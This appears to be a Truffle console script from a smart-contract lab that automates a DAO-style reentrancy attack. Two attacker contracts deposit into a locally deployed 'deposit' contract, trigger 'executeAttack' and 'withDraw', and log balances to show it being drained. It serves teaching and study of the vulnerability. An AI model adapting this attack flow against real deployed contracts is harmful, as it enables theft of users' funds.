// This is a script for running the commands in the README automatically 
// In truffle console execute 
// migrate reset
//d = await Deposit.deployed();
//await d.sendTransaction({from:accounts[0],value:web3.utils.toWei('15', 'ether')});
//Once deposit contract has some Ether in it
//exec ./DAO.js

module.exports = async function (callback){
    let result;

    
    
    const Deposit = artifacts.require("deposit");
    const AttackA = artifacts.require("attackA");
    const AttackB= artifacts.require("attackB");


// define f
d = await Deposit.deployed();
A = await AttackA.deployed();
B = await AttackB.deployed();


result = await A.sendDeposit(258)
console.log(`Send contract A Deposit of  258 (wei) Tokens ${JSON.stringify(result.receipt.status)}`);

result = await web3.utils.fromWei(await web3.eth.getBalance(d.address));
console.log(`Balance of Deposit: ${result} ETH`);

result = await web3.utils.fromWei(await web3.eth.getBalance(A.address));
console.log(`Balance of Contract A: ${result} ETH`);

result = await web3.utils.fromWei(await web3.eth.getBalance(B.address));
console.log(`Balance of ContractB: ${result} ETH`);

result = await A.executeAttack(true);
console.log(`Call executeAttack to toggle ToraTora ${JSON.stringify(result.receipt.status)}`);

result = await A.withDraw(258);
console.log(`Execute attack transaction receipt ${JSON.stringify(result.receipt.status)}`);

result= await web3.utils.fromWei(await web3.eth.getBalance(d.address))
console.log(`Balance of Deposit: ${result} ETH`);

result = await web3.utils.fromWei(await web3.eth.getBalance(A.address))
console.log(`Balance of Contract A: ${result} ETH`);

result = (await d.getDepositBalance(A.address)).toString();
console.log(`Token balance of contract A ${result}`);

result = (await d.getDepositBalance(B.address)).toString();
console.log(`Token Balance of contract B ${result}`);

result =  await B.executeAttack(true);
console.log(`Call executeAttack to toggle for contract B ${JSON.stringify(result.receipt.status)}`);

result = await B.withDraw(258);
console.log(`Execute attack from contract B transaction receipt ${JSON.stringify(result.receipt.status)}`);

result = (await d.getDepositBalance(B.address)).toString();
console.log(`Token Balance of contract B ${result}`);

result = (await d.getDepositBalance(A.address)).toString();
console.log(`Token Balance of contract A ${result}`);

result = await web3.utils.fromWei(await web3.eth.getBalance(d.address));
console.log(`Ether balance of Deposit contract ${result} ETH`);

result = await web3.utils.fromWei(await web3.eth.getBalance(A.address));
console.log(`Ether balance of contract A ${result} ETH`);

result = await web3.utils.fromWei(await web3.eth.getBalance(B.address));
console.log(`Ether balance of contract B ${result} ETH`);

console.log('End of run');



callback(err);
}

function callback(err){
    console.log(err);

}